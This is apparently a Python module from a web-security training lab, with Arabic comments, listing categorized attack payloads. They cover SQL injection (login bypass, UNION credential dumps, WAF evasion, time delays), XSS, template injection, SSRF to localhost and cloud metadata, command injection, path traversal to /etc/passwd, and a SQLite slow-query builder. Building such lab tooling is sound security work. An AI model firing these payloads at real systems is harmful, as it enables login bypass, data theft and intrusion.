"""
engine/payloads.py — مكتبة الحمولات المنسقة (SecLists-مصغرة للمختبر).
======================================================================
قوائم جاهزة مصنفة حسب صنف الثغرة، تُغذّي Intruder والفحوصات والدروس:
  get(category) / categories() / boolean_pairs() / sqlite_time_payload(n)
  load_wordlist(name) — يقرأ engine/wordlists/*.txt
كل حمولة غير مدمرة (قراءة/انعكاس/إبطاء محلي فقط).
"""
from pathlib import Path

PAYLOADS = {
    "sqli_auth_bypass": [
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "' OR 1=1 --",
        "\" OR \"\"=\"",
        "' OR 'a'='a",
    ],
    "sqli_union": [
        "' UNION SELECT 1,2,3,4 -- ",
        "' UNION SELECT NULL,NULL,NULL,NULL -- ",
        "' UNION SELECT 1,username,password,4 FROM users -- ",
    ],
    "sqli_error": [
        "'",
        "\"",
        "' AND 1=CONVERT(int, 'x') -- ",
    ],
    "sqli_evasion": [  # مراوغة WAF: نفس المعنى بأشكال مختلفة
        "' OR/**/ '1'='1' --",
        "' oR '1'='1' --",
        "'/**/OR/**/'1'='1' -- ",
        "'\tOR\t'1'='1' --",
        "' OR '1'='1' -- ",
    ],
    "xss_evasion": [
        "<ScRiPt>alert(9)</script>",
        "<img src=x oNeRrOr=alert(9)>",
        "<svg/onload=alert(9)>",
        "<<script>alert(9);//<</script>",
    ],
    "sqli_time_generic": [
        "'; SELECT SLEEP(5) -- ",
        "' OR SLEEP(5) -- ",
        "'; WAITFOR DELAY '0:0:5' -- ",
        "' OR pg_sleep(5) -- ",
    ],
    "xss_reflect": [
        "<b>LOCAL-TEST</b>",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        "'\"><iframe src=javascript:alert(1)>",
    ],
    "xss_polyglot": [
        "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert() )//",
        "'\"`><svg/onload=oNcliCk=ASPL9()>",
    ],
    "xss_attr": [
        '" autofocus onfocus=ASATTR9 x="',
        "' autofocus onfocus=ASATTR9 x='",
    ],
    "xss_js": [
        "';alert(9)//",
        "\";alert(9)//",
        "'-ASJS9-//",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",
        "{{config}}",
    ],
    "ssrf": [
        "http://127.0.0.1:5001/api/me",
        "http://localhost:5001/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://169.254.169.254/latest/meta-data/",
        "dict://127.0.0.1:5001/",
    ],
    "cmdi": [
        "127.0.0.1; echo PWN297",
        "127.0.0.1| echo PWN297",
        "127.0.0.1 && echo PWN297",
        "127.0.0.1$(echo PWN297)",
        "127.0.0.1`echo PWN297`",
    ],
    "traversal": [
        "../",
        "..%2f",
        "....//",
        "..%c0%af",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "lab.db",
        "..\\..\\lab.db",
    ],
    "redirect": [
        "https://example.com/",
        "//example.com/",
        "/%5cexample.com",
    ],
    "methods": ["TRACE", "TRACK", "PUT", "DELETE", "OPTIONS"],
}

# الأزواج المنطقية. الدرس من قياس حقيقي على المختبر:
# الزوج القديم ("' OR '1'='1" / "' AND '1'='2") كان **لا يفعّل شيئًا**:
#   1) في سياق LIKE  → title LIKE '%' OR '1'='1'%'  خطأ صياغة SQLite،
#      والتطبيق يبتلع الخطأ (except sqlite3.Error: rows=[]) فيبدو
#      كـ«لا نتائج» — فرق 2 بايت.
#   2) في سياق الدخول → AND hash=... يسبق بالأسبقية
#      فيسقط الشرط → فرق 0 بايت.
# أي أن كل «اكتشاف» سابق على /search و/login كان إنذارًا كاذبًا
# نافذًا لتقلّب حجم الصفحة، لا دليلًا على ثغرة.
# '-- ' يتعلّق ما بعده، فيصلح سياقَي LIKE و= معًا (قياس: 239 و285 بايت).
BOOLEAN_PAIRS = [
    ("' OR 1=1 -- ", "' AND 1=2 -- "),
    ("%' OR 1=1 -- ", "%' AND 1=2 -- "),
]


def categories() -> list:
    return sorted(PAYLOADS)


def get(category: str) -> list:
    if category not in PAYLOADS:
        raise ValueError(f"صنف غير معروف: {category}")
    return list(PAYLOADS[category])


def boolean_pairs() -> list:
    return list(BOOLEAN_PAIRS)


def sqlite_time_payload(n: int = 2500) -> str:
    """حمولة إبطاء معايرة لـ SQLite: ضرب ديكارتي + تقييم جبري لكل صف.

    n=2500 أعطت ~2.1s مقابل ~0.02s للاستعلام الخفيف (معايرة حية).
    count(expr) تُجبر التقييم — count(*) وحدها تُتجاوَز بالمحسّن.
    """
    return ("' UNION SELECT 1,1,'x',(SELECT count(hex(randomblob(30))) FROM "
            "(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 "
            f"FROM c WHERE x<{int(n)}) SELECT * FROM c, c AS c2)) -- ")


def sqlite_fast_payload() -> str:
    return "' UNION SELECT 1,1,'x',2 -- "


def load_wordlist(name: str) -> list:
    """يقرأ engine/wordlists/<name>.txt ويعيد الأسطر غير الفارغة."""
    p = Path(__file__).resolve().parent / "wordlists" / f"{name}.txt"
    if not p.exists():
        raise ValueError(f"قائمة غير موجودة: {name}")
    return [l.strip() for l in p.read_text(encoding="utf-8").splitlines()
            if l.strip() and not l.strip().startswith("#")]
